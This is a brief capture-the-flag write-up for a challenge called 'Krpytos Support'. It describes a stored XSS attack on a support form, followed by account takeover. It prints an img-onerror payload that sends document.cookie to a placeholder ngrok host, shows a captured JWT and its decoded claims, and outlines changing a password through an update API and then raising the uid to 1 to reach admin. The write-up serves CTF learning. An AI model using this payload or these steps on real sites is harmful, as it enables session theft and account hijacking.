Krpytos Support

Solved By : thewhiteh4t

In this one we land on a support page where we can send a POST request, it also contains a backend button which takes us to a login page…
first I thought its a cookie stealing challenge so I send the following payload : 
html
<img src=x onerror=this.src='<NGROK-LINK-HERE>/?'+document.cookie;>

and I got a JWT : 

session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1MzQ4ODV9.JO12yEA44QxXgfUmL3n6Sm4Et2AJc5rkvXkvSMdmFOI

decoded :

{
  "username": "moderator",
  "uid": 100,
  "iat": 1652534885
}

and I got two interesting things here, now the cookie did not work for login for some reason so I went back to enum and found an API endpoint :

/api/users/update

using XHR I sent the following request to change the password :

logged in with the new password :

but moderator doesn’t have the flag so I had to escalate to admin…
using the same payload above I just changed the uid from 100 to 1 and logged in again, I could have got it one go but well…
